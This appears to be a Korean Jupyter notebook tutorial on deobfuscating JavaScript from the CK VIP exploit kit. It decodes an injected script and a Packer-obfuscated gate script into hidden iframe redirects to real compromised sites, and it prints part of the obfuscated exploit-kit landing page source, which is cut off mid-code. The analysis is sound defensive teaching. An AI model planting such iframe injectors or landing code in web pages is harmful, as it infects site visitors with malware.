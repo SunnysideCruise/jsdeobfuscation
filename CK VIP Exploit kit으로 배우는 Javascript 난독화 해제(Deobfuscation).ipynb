{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "b4a638cf-4cda-49d3-8858-1e7f7c656bf4"
    }
   },
   "source": [
    "# CK VIP Exploit kit으로 배우는 Javascript 난독화 해제(Deobfuscation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "a4124fd2-d963-4692-877e-6796c96f8a95"
    }
   },
   "source": [
    "### Author Youngwook Kim\n",
    "#### Ver 2016-11-04"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "f759b219-55b6-44f2-8937-023003bac3ce"
    }
   },
   "source": [
    "## CK VIP 란?\n",
    "\n",
    ">Drive By Download 에 사용되는 Exploit Kit 중 하나이며,\n",
    "\n",
    ">CK VIP, JSNB VIP, CKNB VIP, KAXIN 등으로 불린다.\n",
    "\n",
    ">(CK VIP, JSNB VIP등의 이름은 Exploit Kit landing page에 주석으로 해당 문자열이 삽입되어 있어서...)\n",
    "\n",
    ">2016년 6월 이후 잠잠하다가, 10월 23일 이후 다시 활발히 활동 하고 있다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "5f54d3e4-9b19-4e22-82a8-e049f3054118"
    }
   },
   "source": [
    "## CK VIP 구조\n",
    "\n",
    "> 악성 스크립트가 삽입된 최초의 경유지를 악성코드 경유지 사이트,\n",
    "\n",
    "> 다른 사이트로 리다이렉트되며 직접적인 악성 행위를 하지 않고 landing page 까지 이동시키는 사이트를 Gate 혹은 경유지,\n",
    "\n",
    "> 익스플로잇 코드 및 악성코드 링크가 삽입된 난독화 페이지인 CK VIP Explit Kit Landing Page\n",
    "\n",
    "> 마지막으로 악성코드를 다운로드 받는 파밍 악성코드, 물론 악성코드 유형은 변할 수 있다.\n",
    "\n",
    "![alt text](img/fig1.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "cc7decfd-4e70-4a69-9838-9f07497a094c"
    }
   },
   "source": [
    "## Excercise\n",
    "\n",
    "* 목표: CK_VIP Drive by Download 캠페인을 통해 가능한 모든 javascript 난독화를 풀어보며, 최종적으로 PE 파일이 다운로드 받는 경로를 python으로 풀어본다.\n",
    "\n",
    "\n",
    "### Excercise files\n",
    "\n",
    "* ck_vip.hwf (httpwatcher)\n",
    "\n",
    "* packet.pcapng (wireshark)\n",
    "\n",
    "\n",
    "### Flow\n",
    "\n",
    "1. hxxp://www.movie4989.com\n",
    "* hxxp://www.movie4989.ym4989.js\n",
    "* hxxp://uvcon.com/bbs/icon/index.html\n",
    "* hxxp://lumieskin.com/upload/xc/index.html\n",
    "\n",
    "\n",
    "### 악성 코드 경유지 사이트에 삽입된 스크립트\n",
    "***hxxp://www.movie4989.ym4989.js***\n",
    "\n",
    "최초 경유지 사이트에 삽입된 악성스크립트는 보통 ***메인 페이지나***,\n",
    "\n",
    "메인 페이지가 불러오는 ***자바스크립트***에 삽입된다.\n",
    "\n",
    "예제는 ***자바스크립트***에 삽입된 케이스다.\n",
    "\n",
    "![alt text](img/fig2.png)\n",
    "\n",
    "삽입된 스크립트의 필요한 부분만 추려서 beautify 하면 아래와 같다.\n",
    "\n",
    "```javascript\n",
    "1 var _$ = [\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\", \"\\x63\\x6f\\x6f\\x6b\\x69\\x65\", \"\\x69\\x6e\\x64\\x65\\x78\\x4f\\x66\", '\\x77\\x61\\x6e\\x67\\x3d', \"\\x73\\x65\\x74\\x54\\x69\\x6d\\x65\", \"\\x67\\x65\\x74\\x54\\x69\\x6d\\x65\", '\\x77\\x61\\x6e\\x67\\x3d\\x59\\x65\\x73\\x3b\\x70\\x61\\x74\\x68\\x3d\\x2f\\x3b\\x65\\x78\\x70\\x69\\x72\\x65\\x73\\x3d', \"\\x74\\x6f\\x47\\x4d\\x54\\x53\\x74\\x72\\x69\\x6e\\x67\", \"\\x77\\x72\\x69\\x74\\x65\", \"\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x27\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x75\\x76\\x63\\x6f\\x6e\\x2e\\x63\\x6f\\x6d\\x2f\\x62\\x62\\x73\\x2f\\x69\\x63\\x6f\\x6e\\x2f\\x69\\x6e\\x64\\x65\\x78\\x2e\\x68\\x74\\x6d\\x6c\\x27\\x20\\x77\\x69\\x64\\x74\\x68\\x3d\\x27\\x36\\x30\\x27\\x20\\x68\\x65\\x69\\x67\\x68\\x74\\x3d\\x27\\x31\\x27\\x20\\x66\\x72\\x61\\x6d\\x65\\x62\\x6f\\x72\\x64\\x65\\x72\\x3d\\x27\\x30\\x27\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e\"];\n",
    "2 if (window[_\\$[0]][_\\$[1]][_\\$[2]](_\\$[3]) == -0x1) {\n",
    "3     var a = new Date();\n",
    "4     a[_\\$[4]](a[_\\$[5]]() + 0xc * 0x3c * 0x3c * 0x3e8);\n",
    "5     window[_\\$[0]][_\\$[1]] = _\\$[6] + a[_\\$[7]]();\n",
    "6     window[_\\$[0]][_\\$[8]](_\\$[9])\n",
    "7 }\n",
    "```\n",
    "\n",
    "이 중 필요한 부분은 리스트 \"_$\"와\n",
    "\n",
    "이 리스트를 불러오는 코드 제일 마지막 6번째 라인이다.\n",
    "\n",
    "파이썬은 변수명을 \"_$\"로 할 수 없으니, temp에 리스트를 바로 저장해서 출력하면 아래와 같다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false,
    "nbpresent": {
     "id": "4ef59f25-446b-415d-8616-69b10ba3b074"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "document\n",
      "write\n",
      "<iframe src='http://uvcon.com/bbs/icon/index.html' width='60' height='1' frameborder='0'></iframe>\n"
     ]
    }
   ],
   "source": [
    "temp = [\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\", \"\\x63\\x6f\\x6f\\x6b\\x69\\x65\", \"\\x69\\x6e\\x64\\x65\\x78\\x4f\\x66\", '\\x77\\x61\\x6e\\x67\\x3d', \"\\x73\\x65\\x74\\x54\\x69\\x6d\\x65\", \"\\x67\\x65\\x74\\x54\\x69\\x6d\\x65\", '\\x77\\x61\\x6e\\x67\\x3d\\x59\\x65\\x73\\x3b\\x70\\x61\\x74\\x68\\x3d\\x2f\\x3b\\x65\\x78\\x70\\x69\\x72\\x65\\x73\\x3d', \"\\x74\\x6f\\x47\\x4d\\x54\\x53\\x74\\x72\\x69\\x6e\\x67\", \"\\x77\\x72\\x69\\x74\\x65\", \"\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x27\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x75\\x76\\x63\\x6f\\x6e\\x2e\\x63\\x6f\\x6d\\x2f\\x62\\x62\\x73\\x2f\\x69\\x63\\x6f\\x6e\\x2f\\x69\\x6e\\x64\\x65\\x78\\x2e\\x68\\x74\\x6d\\x6c\\x27\\x20\\x77\\x69\\x64\\x74\\x68\\x3d\\x27\\x36\\x30\\x27\\x20\\x68\\x65\\x69\\x67\\x68\\x74\\x3d\\x27\\x31\\x27\\x20\\x66\\x72\\x61\\x6d\\x65\\x62\\x6f\\x72\\x64\\x65\\x72\\x3d\\x27\\x30\\x27\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e\"]\n",
    "print temp[0]\n",
    "print temp[8]\n",
    "print temp[9]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "6f4defb7-1308-4513-b69c-05edfd2863b2"
    }
   },
   "source": [
    "이를 위의 javascript로 바꾸면 아래의 코드와 같다.\n",
    "\n",
    "```javascript\n",
    "window[\"document\"][\"write\"](\"<iframe src='http://uvcon.com/bbs/icon/index.html' width='60' height='1' frameborder='0'></iframe>\")\n",
    "```\n",
    "\n",
    "\n",
    "\n",
    "이를 세 부분으로 나누어서 설명하면,\n",
    "\n",
    "* iframe: 일반적으로 다른 웹 페이지를 보여주기 위해 사용되나, DBD 캠페인에서 악성 스크립트를 불러오기 위해 사용\n",
    "[more](http://www.w3schools.com/html/html_iframe.asp)\n",
    "\n",
    "    exercise 0x01: 1.html\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "* document.write: javascript로 html에 코드를 쓴다고 생각하면 쉽다.\n",
    "\n",
    "    일반적으로 테스트에 사용되나, DBS 캠페인에서 악성 스크립트를 불러오기 위해 사용된다.\n",
    "    [more](http://www.w3schools.com/jsref/met_doc_write.asp)\n",
    "\n",
    "    excercise 0x02: 2.html\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "* window: javascript의 window 객체는 브라우저에서 window를 열라는 의미이다.\n",
    "\n",
    "    window 객체 때문에 javascript 분석시 사용하는 도구들이 정상적으로 동작하지 않는 케이스가 많다.\n",
    "    [more](http://www.w3schools.com/jsref/obj_window.asp)\n",
    "    \n",
    "    excercise 0x03: 3.html\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "6a2d673f-f3af-4e6a-8033-c57bc2f12962"
    }
   },
   "source": [
    "### Gate(경유지)\n",
    "***hxxp://uvcon.com/bbs/icon/index.html***\n",
    "\n",
    "uvcon.com/bbs/icon/index.html 에 삽입된 스크립트는 아래와 같이 난독화 되어있다.\n",
    "![alt text](img/fig3.png)\n",
    "\n",
    "function(p, a, c, k, e, d){ ... \n",
    "\n",
    "로 시작하는 난독화 방식은\n",
    "\n",
    "Dean Edwards' Packer를 사용한 난독화 기법이다.\n",
    "\n",
    "이 Packer는 2006년 부터 꾸준하게 악의적으로 많이 사용되어 왔다. \n",
    "\n",
    "아래와 같은 페이지를 이용하여 Dean Edwards' Packer로 정상적인 코드를 패킹 혹은 난독화 할 수 있다.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false,
    "nbpresent": {
     "id": "25e50669-9200-4d8a-9cd5-8e618e4b6f28"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<iframe src=http://dean.edwards.name/packer/ width=700 height=350></iframe>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import IPython\n",
    "url = 'http://dean.edwards.name/packer/'\n",
    "iframe = '<iframe src=' + url + ' width=700 height=350></iframe>'\n",
    "IPython.display.HTML(iframe)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": false,
    "nbpresent": {
     "id": "e2971bd0-ea4c-406e-9576-303b2743ebf5"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<iframe src=http://javascriptcompressor.com/ width=700 height=350></iframe>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'http://javascriptcompressor.com/'\n",
    "iframe = '<iframe src=' + url + ' width=700 height=350></iframe>'\n",
    "IPython.display.HTML(iframe)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "14046f6c-ea53-42d1-ab75-eb6ced7c6343"
    }
   },
   "source": [
    "Dean Edwards' Packer는 간단히 Kahu Security가 개발한 Javascript Deobfuscator를 이용하여 \n",
    "난독화 해제 할 수 있다.\n",
    "![alt text](img/fig4.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "b6c6123a-2cda-4b1e-97c4-56624d797fab"
    }
   },
   "source": [
    "하지만, 우리는 항상 툴에 의존적이지 않아야 하므로 \n",
    "\n",
    "python으로 풀어보기 위한 노력을 해야한다.\n",
    "\n",
    "해당 코드를 beautify 한뒤 코드를 분석하도록 하자.\n",
    "\n",
    "```javascript\n",
    "1 eval(function(p, a, c, k, e, d) {\n",
    "2     e = function(c) {\n",
    "3         return (c < a ? \"\" : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))\n",
    "4     };\n",
    "5     if (!''.replace(/^/, String)) {\n",
    "6         while (c--) d[e(c)] = k[c] || e(c);\n",
    "7         k = [function(e) {\n",
    "8             return d[e]\n",
    "9         }];\n",
    "10         e = function() {\n",
    "11             return '\\\\w+'\n",
    "12         };\n",
    "13         c = 1;\n",
    "14     };\n",
    "15     while (c--)\n",
    "16         if (k[c]) p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]);\n",
    "17     return p;\n",
    "18 }('c(4.7.9(\\'5=\\')==-1){d 2=g f();2.e(2.b()+i*3*3*h);4.7=\\'5=8;a=/;2=\\'+2.j();4.s(\"<6 r=\\'q://v.u/t/m/l.k\\' p=\\'3\\' o=\\'1\\' n=\\'0\\'></6>\")}', 32, 32, '||expires|60|document|asda|iframe|cookie|Yes|indexOf|path|getTime|if|var|setTime|Date|new|1000|12|toGMTString|html|index|xc|frameborder|height|width|http|src|write|upload|com|lumieskin'.split('|'), 0, {}))\n",
    "```\n",
    "\n",
    "18 번째 코드에 각각 p,a,c,k,e,d 에 해당 하는 인자를 전달한다.\n",
    "```javascript\n",
    "p = 'c(4.7.9(\\'5=\\')==-1){d 2=g f();2.e(2.b()+i*3*3*h);4.7=\\'5=8;a=/;2=\\'+2.j();4.s(\"<6 r=\\'q://v.u/t/m/l.k\\' p=\\'3\\' o=\\'1\\' n=\\'0\\'></6>\")}'\n",
    "\n",
    "a = 32\n",
    "\n",
    "c = 32\n",
    "\n",
    "k = '||expires|60|document|asda|iframe|cookie|Yes|indexOf|path|getTime|if|var|setTime|Date|new|1000|12|toGMTString|html|index|xc|frameborder|height|width|http|src|write|upload|com|lumieskin'.split('|')\n",
    "\n",
    "e = 0\n",
    "\n",
    "d = {}\n",
    "\n",
    "```\n",
    "\n",
    "16 번째 라인의 코드가 정규표현식을 이용하여 k에 저장된 list에 해당하는 문자열을 \n",
    "\n",
    "p에 저장된 문자열의 숫자로 치환하며 로직을 가진다.\n",
    "\n",
    "동시에 p에 저장된 알파벳 a를 k 리스트 10번째 값 , b를 k 리스트 11번 째 값으로 변환하는 작업을 해야한다. \n",
    "\n",
    "이를 파이썬으로 만들어 변형하면 다음과 같다.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true,
    "nbpresent": {
     "id": "fd6633a8-c041-42f7-943e-62d0931b1a5d"
    }
   },
   "outputs": [],
   "source": [
    "p = 'c(4.7.9(\\'5=\\')==-1){d 2=g f();2.e(2.b()+i*3*3*h);4.7=\\'5=8;a=/;2=\\'+2.j();4.s(\"<6 r=\\'q://v.u/t/m/l.k\\' p=\\'3\\' o=\\'1\\' n=\\'0\\'></6>\")}'\n",
    "a = 32\n",
    "c = 32\n",
    "k = '||expires|60|document|asda|iframe|cookie|Yes|indexOf|path|getTime|if|var|setTime|Date|new|1000|12|toGMTString|html|index|xc|frameborder|height|width|http|src|write|upload|com|lumieskin'.split('|')\n",
    "e = 0\n",
    "d = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true,
    "nbpresent": {
     "id": "12dbba91-dab2-46c0-b654-817f04d0cef7"
    }
   },
   "outputs": [],
   "source": [
    "def unDean(p,a,c,k,e,d):\n",
    "    import re\n",
    "    for i in range(a):\n",
    "        try:\n",
    "            if k[i]:\n",
    "                p = re.sub(r'\\b{}\\b'.format(str(i)),k[i],p)\n",
    "        except:\n",
    "            pass\n",
    "    \n",
    "    charCode = 'abcdefghijklmnopqrstuvxwjy'\n",
    "    for char in range(len(charCode)):\n",
    "        try:\n",
    "            tmp = char + 10\n",
    "            p = re.sub(r'\\b{}\\b'.format(charCode[char]),k[tmp],p)\n",
    "        except:\n",
    "            pass\n",
    "    return p\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false,
    "nbpresent": {
     "id": "a5f10123-5e63-4196-a3a8-c3df92be6fd3"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "if(document.cookie.indexOf('asda=')==-1){var expires=new Date();expires.setTime(expires.getTime()+12*60*60*1000);document.cookie='asda=Yes;path=/;expires='+expires.toGMTString();document.write(\"<iframe src='http://lumieskin.com/upload/xc/index.html' width='60' height='1' frameborder='0'></iframe>\")}\n"
     ]
    }
   ],
   "source": [
    "result =  unDean(p,a,c,k,e,d)\n",
    "print result"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "1f33528f-b649-4175-a361-7513fcdd7c71"
    }
   },
   "source": [
    "난독화 해제된 코드에서 iframe에 삽입된 exploitkit landing page 주소를 확인할 수 있다.\n",
    "```html\n",
    "<iframe src='http://lumieskin.com/upload/xc/index.html' width='60' height='1' frameborder='0'></iframe>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "f5b3946c-a331-4f61-a495-aa44a48a0fed"
    }
   },
   "source": [
    "### Exploitkit Landing Page\n",
    "\n",
    "Dean Edwards' Packer라는 산을 넘으면, 이제 보스몬스터인 CK_VIP Landing Page로 납치된다.\n",
    "\n",
    "아래와 같이 난독화된 코드를 볼 수 있다.\n",
    "![alt text](img/fig5.png)\n",
    "\n",
    "코드 전체는 이렇게 생겼다.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "e7174d98-1a5f-4c33-b0a7-0ea31529254e"
    }
   },
   "source": [
    "```html\n",
    "<html>\n",
    "<body>\n",
    "<script type=\"text/javascript\" src=\"jquery.js\"></script>\n",
    "<script type=\"text/javascript\">\n",
    "var vHz2=window[\"\\x65\"+\"\\x76\\x61\\x6c\"],ALYgrt3='\\x2A',HlssUrQp1='\\x73\\x70'+'\\x6c\\x69'+'\\x74',benz='DnQbUo',audi='GyLgNp',jaguar='KaNlYq',vhz2z='',ferrari='NlHzQi',bugatti='QvBeJj',maserati='XiYxMl',astonmartin='a',GTR='b',vhz2z4='*i*v*var**out*str**len***charCodeAt**case*y*return*if*length*z*c3*p*c4*0xff*while*sum*break*s*String*c2*e*function*char2*n*c1*c*0xffffffff*mx*nbChar*ErTiUlaxlkP*w*X3cQCMIIF*AVgHbu2f*fromCharCode*t*do*char3*BMOYPRD4H*6b*str2long*for*k*delta*0x3F*vl*join*utf8to16*KeY*NtCion*key*false*itVm_snY3*sl*q*nbencode*long2str*GIEMslIELDjE*nbcode*HgAGJ6WJYFL*fYcoa*e62g5*HlG2Q0h6qH4VDaIszr*0qok8YGem8PmDiLUw1EYKPIRFxU1kZS43mmanxoE*fgve7a*1tp1ALr5sXKzYLxaH*dG9voAXeorZrnD5DajGhFD*oEAN*ATYDZH4phKQMGo2iDgqA4W24hONU2RMt3yq*7OSS3gt*GlXx3vsD0bwf3lHbLW2anQJddojjhVbr*ejzoyWiqVmI3k5ynQBm3hwOUTmms6axy65JaOJwrGt5xrWmwfpSML0BjDG0yL0kztCJTt1xA8d6DyNW9zy1ABQJcfFyYn*vWQMtSWSbIwgH4UzcN6nuRP7n4q99PZW8jteXrpgcQgdpbkHABTO*8HGJCh1idEw0Bo1W16p*xDZQ8E9rr1JGJK3KJiBmzrhKFLJJ2LI*mCha*fro*ZAahwtK2U6NgKmp13YoeoilvC0vp6wF*rCode*u7Ut0F6v38CNH5ZES0E3m63EoH6jiqQ0C34YLxEGj4fe1HJR7qfkMDH*pXOgyMMQN4mrhhFnVzRoAOqHdEOzBVP1JcGfzyapNUBLtiJYSX6rkDEngp2hxabHEffuILBKShxC1bu1OX5*DUuT1*0x03*42sQFqveZmFthRv9cRLEkx085ih8*amFXzdlWQ*0x30*oN3EVk65oyD*URpV4C1J2OgUiPds9gRcT4Mqw8cJJ9LTWOuaw9xXC5mwBWVcpg0sTiGre6rgp8xCMkX1YKT8oHjab2AZEMDCiLgEh7nnUSgiiV1T74oxS1yk8q27WkM9HuSnXqE9MQgJaMOgu*l96SCzj854x2RKmOvxs*0XF*MyyiqZ3ee5TbHN2GYG*0x3C*XntEaVVyQ27nj9E9R3y3nf0*NS6V*Array*vYJzslNjO6Q2S90TOo3JLhsIdr8o8FzBxgYbwwFLnmD5TGMOVEOeLiuTVOr8ZaSi*new*xBVxhwEX6C9bAWV1OP0wlQv5u4MnvT4iGviRs7C4FHPOcBb3pThPQCFDHnB6N5816ae7uIomfAYpCQzFG3EifoJsWn79A4si*0x0F*mW*dxFOn8Q6376zO1qm1P5bEH9C4G1*CMfBZkeNIl4oQka8g*YwYzTYchmXxY7*axTs0jn4qynjKptUQA28sJm*Pa0dlGfkquC*pKo8UF3jCi5fzTrEnDDLvMByVL7g*de*6iJLK2aWHg9JPUx0Eum1ni*switch*fNmmjSrTgJixN5WBZwyzKQDCvxAAPtBRUlekSb*VpZLp4BQ4hilnf9LgHTRzeuedKUntBj6tQOoDT4Ckt*Ej0AwthrOZX2r8WsU4KV4dXYn86bb0kGBJAU4pr4kGas8dD71qW94OLX*charAt*0x1F*harCo*omC*fr*bPtzChOQUHK4raiXfw1kAS01hvc6mXUR59d9792VVQKhjgKgA1fh24TTS82HwlQU2fm6eqYtzE6hvrdRfaSLRIDsFRIifn9gfkRUoVqDG0WRXTKr*elAU9xX7rVuSOkz28mCGZylP*VYFYmjafyrmdCYPbyNXiGoiE9AjsNMZ0xjS*m8gdyaOXgSv0QTIS6Z3T6ZC14*mri0hTbS4RbK4Moo18LyZjQHSgZj*7kpwrNKACTYryrtGh3usPHhiFDs8GGEFJDit2Eyk6ZZNODzTxzXhT6yOLuM06uY*UHs8pJ3fp1TRSUNWam*L1UO*qe40e0h3mKHqimOewpSVdGzQb4vxNMfh4gj0IWEvkNc1wzcQMDq6UEi*pOKgpmbCSJIFpzVHlcB9LQae7SKNl6y51j7CSURxLrurhaDCwQjN0FTWVd85TmX7wmR6M1ynZ8zqJpIEa5daTeOKqYdNKAqaEwdHQI2HFrW5eRqQmEktl72YZhdLMgXbY*Whw0VLgIjGuJH7CcSUre*0978HzQaMXXz24WBWm1QbyiYGVGCoCLU3nbBjJ6*RslR2csadulegltGOKgc3I9SDHt4kWdn65cft*L*r4VoMb*lpAu7f3ml9n1QAJlTInnzzynohGLlVnRURDHp0gbyISumaTAuJvLviW4R40boA*QbqVoKOyjolYj9vHKOGhLZq9n7lDMKvb4eZ61QQbsGXciI1eM6CKrbq8VT6eMHecnqJASAk0I2d4NXSqLmVB2qch1rTDslN25KH3nHZqrpc4uJ7v5XBqJ1dYKvFilTuCjCsSOuDoFVHNxq52P*ufSAZ9s0DCG91NKkPSIih7Yny*fxvsOrkrOBTu4ekO3sOwaHqILAonzSt0whMC0e*gZ*YK1qy1X*U5a9*WOkEKWr5AqY8rlPmppLzySTD8duxe1MdxB7eq*Mwtrb*56io9PcHvHsBlE5kuKeN4gcYr0gEFmxCTmzysfYnGsRmk4useGZtT0UGwtkHWGdfVPzumQ*PkwHurzm74ZKrN3M4CJdiL1ORQKSPtsD9s0LeYmx4dr1zaalo6ElNx3E2x8rD7*Vc5RIc5Zpwan4RBM2mTVsgiVdJOyqwHug9QucLLcRRp5mDTGJiz0UALKtfDabnee2J5qQzWvr2yRyTfyQebMtCCr*3fjg6YwKqpgOB8iHDU3UBPzKk8yEtb0Gmx*window*3goD*9N*4J9tUQi99zY4Bjmc1SyADJiqeDNkY7b8uw7XL4kwrpwy4GVDsMh8m6P1wPp*7kxPX506IoEGeoQ2swFj*bzvyk*39XgaLNhwLo9ErYLLi7fnP82Ux*zng3hPhYID*AYYJV2Ud1dvs7DYy0No*RigwWVLYW*BSX4ZQZoW6x0JH3RIbEH9ME1tABADI2DmaO87lIlQGSQ57d1KpJ7sJ8rQ8AeXyaAaTtW2nVefxcirTmnYoxiACYxk8F4pBDOCvm3mDkm5ApqQvmKTuwMrFu9*Tq1bIKvOmdKRqbNpdb5cGc3d*R2aUXN899lY*v4OkEe2ZxGcvth257PwVQb0ub5SgV5puFW4gde5w6clapbI2AAykDr7QUrPgpGH1PYlozHJPURX61ROk2gHLC01k3I9d6pjtn*IEZe8uY2TqqwEu5jykd3J55XXaJ42d*7YK81INsk6Uz8l*0vsNw5FqmQEAYuplFrt98a2yCWVTs5yrpYKiWDO9uxVOLjcBLsyFQJgGhD9gRWav3SuqfMyW3dvM3BZActgas4Xo5oz624ZWKPw4VoTjtoJSnlEyrfye8r*lH9qOZis6wzk8Y8QctBLsIx69FHY7B*11UG*RS4ADhxypxfdvlfCrKRC4ISQSpRbU4BWkZzFoIFTN3haSKVGiagHKJ2mT9Tqf8X0xDWH6lYahWKW9dW31h0z7x2yHx7n56QR3w8gRuDuId*5d5eN0VqfrPFvyGkFV5JrU88oxT1pUXG8CBtFQxgicMh3P6bNaELkOO*GeJQAMbK6K77TumvrlEFonf0Ovi2iniFbh08m3cQAORcARLQNepCElHUY4P8VhdYCjNvFNHaPBm5HXmma*KJb6Nqq8BoBvStBLoTM9TzGhnOLku3jWkOlk53wUW4Z0H6EplheWJLUeQX7cG9oG*nmQnIZzlUhV0Wyaey2CcYzui1JHsBTCTJarjN9z3nwybtCm6M0KT1eK1NSi0PB5FbMvSJK*4QBMjo6UHuEH3T88jkp3bnRxrxsxNQ7uWrmy57UrSgJLFUH3lwBXDoGbtK0VmGvI4iiTl6e4b*s6l0Z8jQJ3XXImIWJyu*hJJh8F2*cgXfUFuX*HckMdGiuKNssm5kbzjtQsQEh*vNuqLcoYTrSTt8RSmaaaUrrN9oh9dTfmFDntxyvb1zVMBGcRIgAWH*HEMkeq00gxjBRkgWVVRg5BYieaXlNO7NSuRtEBQPXuGS77HbBL7RN1smIvvstap0z2XB41ZUwvmIEbA8spyRUenDvfHpIR9iZwABF5RycqD1L*2YKxCgTszXTQMG2oJwN3apfWcUpELQerhfLfGdeIIgB0IFr9CyK7f*akDF7LEZES6W8VDwuXk*cm*m1k7Jn3t91i2bkIHOOdcRsiLlE8DhbE50QNUydQZiHl9F8G5DDgioIZnWwJ*0lvtF4acl*NanzUKOF5FgAUfEjCvARRNUDM5enzjpU*zOJcI71AVXyOoj5rFb4rG6RCPZ2mKMBndrtJNDwjEylqCWGflKjK4MF*x5EhVdw5SGIfKJJ5LzQa6MQnvkVXW4RWFPYX6S4L7qHN1cAdqyP7pXB*oAsrqxNA3ebBW4xx81xdOJaKvG6OW*c9arTYmROBS4vzYMzHdMAj0bfDFi4GCR5cyseIiMUcr7rcsxDteAsz9s4qrbMLpvLvOn3zIGcFphhJxG90dObQ7z0pOUvPepQ77AM5YgyeKtHvzoJb*eQqB*7A87pQ*AHr6iDjpx1z*INsC5yTHcbqgdJrnB2CZ1cr9cLkvS8IbNys*AHcHxkhsJ25nzRdVqncUVuMTfXD1Da7XK0CE*z9PfA6SKi1KZ8sMCgYPcX7Llw*6f*floor*Math*DXeQ8Ih00L*cap*u*nes*OiJWnvyvFI4AXlD01xbhjmjIRg*0x9E3779B9*MJvwFbd9kybNV6kaSOLSwkReClcCszUaCXIR1WlqdWdrH*6e*else*substring*4Wf5AE0685fcTNz3asrk0agsEeRfJs5bGkTGtO*6d*S4UVbzmZkoWK47LPfS3uyUuVEqqneI*PBI5u4uTRy*HK7SlQJ1XFyJf1lUCdzMCg7MUduRoSp2fVRgfHNaJ32UOnFfl9wj7ulzOunE4LeReuCOONVQCdpaPl0jX2LM1iJTJEqyYtPCFRgS0R8l84ZLYnCC1Q6Jur*nbVZ1ZS3o4vpMZv3AoXhga2Xlo4jjDUTf*zV3YTRnmEORpJKjStNiO1z1E0FEGyLuAxFhZ7Nues1ggxglPcwCFeDO*qTmtx8O4Seda4030oiqSTS6is7sI*DapdSDguBoHvg9*4Gv1HWXHlKcXFpbcYX83wLm8j9b07ADGPUD4ZNGjTwrnWxNhcbaDpOfugoEtoulQbKmquLikWS8ZgAKkOIzY*qARPnOweHAUqWgazndLTM0gS7ATt3I2oVSo7pkXj0XKjMTvJDOCpg*FgyKA8mgKvqN5hTNrOXx*UlGk0*RKTmRqmPe7Duq0BZbluMqlksoaE2vD6bKFJbCe4iRQ6GwTeWVZzC9o7lzxw3g*WrC90B2350tY5UiuZDOcu3YpFeDDyLQ0AM6Xrx7YIzzzeNKzpjs3Xy6Uy9eBfnmIzdRrocXduhAa3Gw4LMsAfU*FAD2*DjkJa8Tls3*LuR5uQzyZb4ZlDpSK66wVli90C5VjWZaeYhdejefUdXsNpgo0ZLRvi1Jy4N9J*oWla84oDmdoetK4APv2JHRc0vTqk*HWFShDHe44QG3xMzqtkDjPF7L4Ix7*M7JgrZspyS4kc*zeR9GNyNmEfbyK*eval*86eHPf9YN3*true*yOgaV7gTJK73IoMxaEc6pn0s*hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO*HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS';try{window[\"a\"+\"\\x6c\\x65\\x72\\x74\"](a,b,c);}catch(e){for(var j=0;j<65;j++){vhz2z+=ALYgrt3;}var /*JS's NB*/vhz2z3/*JS's NB*/=/*JS's NB*/vhz2z/*JS's NB*/+/*JS's NB*/vhz2z4;/*NB VIP*/vHz2(/*10.21*/function(/*Js'NB VIP*/p,/*Js'NB VIP*/a,/*Js'NB 